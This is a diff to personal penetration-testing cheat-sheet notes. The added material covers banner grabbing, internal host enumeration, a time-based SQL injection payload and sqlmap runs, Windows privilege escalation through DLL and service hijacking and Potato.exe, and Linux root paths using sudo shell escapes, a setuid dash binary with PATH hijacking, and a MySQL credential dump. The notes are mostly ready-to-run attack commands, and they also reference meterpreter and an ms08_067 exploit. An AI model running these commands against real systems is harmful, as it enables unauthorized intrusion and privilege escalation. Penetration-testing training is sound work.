@@ -49,7 +49,7 @@ wireshark
 
 ----------------------- NEW METHOD --------------------------
 
-Get in an set up non root user in Kali; set passwd; add to sudo; cp /root/ to /home/user1; log back in as user1
+Get in an set up non root user in Kali; set passwd; add to sudo; cp /root/ to /home/user1; add to wireshark group; log back in as user1
 
 
 ============================================================================================
@@ -107,6 +107,9 @@ Manual Banner Grabbing
 #connect to the target port
 nc -nv $tgt 80
 GET / HTTP/1.1
+HEAD / HTTP/1.1
+echo -e "HEAD / HTTP/1.1 \r" |nc -nvv $tgt 80
+
 #Hopefully response has version of the software
 
 #What about 443????
@@ -266,6 +269,34 @@ netsh int tcp set security mpp=disabled
 
 bootcfg /raw "/noexecute=alwaysoff"
 
+======================================================================================
+				INTERNAL ENUMERATION
+		Goals: understand who, what, where, when, Why
+			Remember: Check, Collect, Clean
+=======================================================================================
+
+1. Who else is on right now?
+Linux: w
+Windows: query user		remotely: query user /server:computername
+
+2. Who has been on?
+Linux: last
+Windows: ?
+
+3. What has this box been talking to?
+Linux: arp -e, check ssh known_hosts
+Windows: arp /all, check ssh known_hosts
+
+4. What is this box able to talk to?
+Linux: route print, ip addr
+Windows: route print, ipconfig
+
+
+
+
+
+
+
 ==========================================================================================
 			     SQLI
 	Goals: Enumerate DB's; Find Creds and or rain shells.
@@ -281,14 +312,14 @@ bootcfg /raw "/noexecute=alwaysoff"
 #SELECT columnsYouWant FROM tablesYouWant WHERE informationMatchesWhatYouWant
 #Example: SELECT column1, column2, column3 FROM table1 WHERE column4='user' AND column5=3 AND column6=4;
 # will retrieve from the following table:
-#column1	column2	column3	column4	column5	column6
-# 1					test		Paul		user			3			13
-# 2					test1		Robert	user			3			4
-# 3					test33	Super		user			3			4
+#column1	column2		column3		column4		column5		column6
+# 1			test		Paul		user			3		   13
+# 2			test1		Robert		user			3		   4
+# 3			test33		Super		user			3		   4
 # the following info:
 #column1	column2		column3
-#	2				test1			Robert
-#	3				test33		Super
+#	2		 test1		Robert
+#	3		 test33		 Super
 # Note Row 1 wasn't selected because of what was matched in Column 6.
 # Only the first 3 columns were selected because of the query
 
@@ -449,7 +480,7 @@ sqlmap - u $tgt/url --dbms=mysql --forms --banner -D $targetDB -T $tgttable -C n
 
 #--technique= manually select the type of attack. Specify which one you know works to save time.
 
-sqlmap -u http://$tgt/ --crawl=20 --threads=5 --forms --batch --dbms=mysql --dbs   FOUND IT!!! BITCHES!!!!
+sqlmap -u http://$tgt/ --crawl=20 --threads=5 --forms --batch --dbms=mysql --dbs  
 
 PAYDAY EXERCISE
 csid =  ' AND SLEEP(5) #
@@ -565,7 +596,38 @@ location of passwords: /var/www/wordpress/wp-config.php
 ==========================================================================================
 				PRIV ESC
 ==========================================================================================
+---------WINDOWS-----------------------------------
+Great script to get started with is PowerUP:
+https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+PowerUP is only a decent start - and it doesn't find everything...
 
+March 19 Update of most common windows PrivEsc Paths:
+
+1. command histories
+2. DLL Hijack
+3. Service Hijacking
+
+
+1. Command histories
+doskey /history
+
+2. DLL Hijacks
+- DLL Load order
+- Missing DLLs (For example the office fax.dll)
+
+Use ProcMon to find phantom DLLs and set it to filter for create file; return code for Not Success- then show results for NAME NOT FOUND
+Make Proxie DLLs if you want to keep the program from crashing
+
+Check for folders such as C:\Program Files\ for "Create Files" or "Append Data" permissions - allows users to install anything or add DLL's
+
+3. Service Hijacking
+# If you can write to a dir that a service calls a dll from you win...
+# HKLM/System/CurrentControlSet/Services
+# If you can set a value or a subkey on any of these you are going to be system soon
+
+
+
+------------------------------------------------------------------
 "net localgroup administrators low /add"
 
 ##FUZZY METHOD###-=WINDOWS=-
@@ -703,6 +765,82 @@ Potato.exe -ip -cmd "C:\\windows\\system32\\cmd.exe /k net localgroup administra
 pot.exe -ip $tgt -disable_exhaust true -cmd "C:\\windows\\system32\\cmd.exe /k net localgroup administrators lowprivguy /add"
 
 ************************************LINUX***************************************
+Mar 19 Update of most common paths to root!:
+Automated:  the script lse at: https://github.com/diego-treitos/linux-smart-enumeration.git
+
+1. Command histories
+2. "secret" files
+3. sudo abuse
+4. insecure permissions
+	a. custom scripts
+	b. setuid
+
+1. Command histories
+history
+cat ~/.bash_history
+
+2. Secret files
+ls -lha
+
+3. sudo abuse
+# Check if the user has sudo access to certain commands....
+# Hopefully the user has sudo access to less/more, find, or a script interpreter like Python
+sudo -l
+
+# INSTANT WIN! If the commands don't have the full path you can just create anything you want
+# by the same name in your local path and run as sudo... more modern linux will look at trusted paths
+# first... however if that file is missing for some reason it will continue down the path
+
+#less
+less /var/log/messages; then inside less type "!/bin/bash
+
+#find
+find /var/log -name messages -exec /bin/bash -i \;
+
+4. insecure permissions
+a.
+# By default home dirs are created world readable
+- start-up scripts		~/bashrc's   /etc/systemd/  /lib/systemd/	
+- possible cron jobs	/etc/crontab  (theres a few to look at)
+- Follow the bouncing ball on what the scripts are calling...
+b.
+# To find setuid / setgid 
+find / -perm -4000 -o -perm -2000 2>/dev/null
+find /usr/bin -perm -4000 2>/dev/null
+
+for i in $(find / -perm -4000 -o -perm -2000 2>/dev/null); do ls -lha $i;done
+for i in $(find /usr/bin -perm -4000 2>/dev/null); do ls -lha $i;done
+
+# What does the bin or script call? look for exploitable 
+ltrace /usr/bin/custom.sh
+# Does anything lack a full path to the command?  If not create your own new command in local dir
+# Make the new malicious script that calls #!/bin/dash as dash DOES NOT DROP setuid bits; where as bash does
+----example-----
+#!/bin/dash
+cp /bin/dash evil
+chown root:root evil
+chmod u+s evil
+-----------------
+chmod 755 name-of-hijacked-command
+# Now set your path up to hijack the command; this says grab anything from my local path first!
+export PATH=.:$PATH
+
+# Now call the hijacked script
+
+
+Check MySQL example from Jake Williams
+get root
+mysql -u root -p itsasecret
+show databases;
+use servers;
+show tables;
+# See a table called auth
+describe auth;
+select * from auth;
+l00t!
+############### G0tm1lks ################
+
+----- Easy button - Kernel Exploit -----------
 cat /etc/issue
 cat /etc/*-release
 
@@ -982,7 +1120,7 @@ set payload windows/meterpreter/reverse_tcp
 
 use exploit/windows/smb/ms08_067_netapi
 
-nmap -Pn -sT -n -p 80
+db_nmap -Pn -sT -n -p 80
 
 =======================================
 Shells Alternative
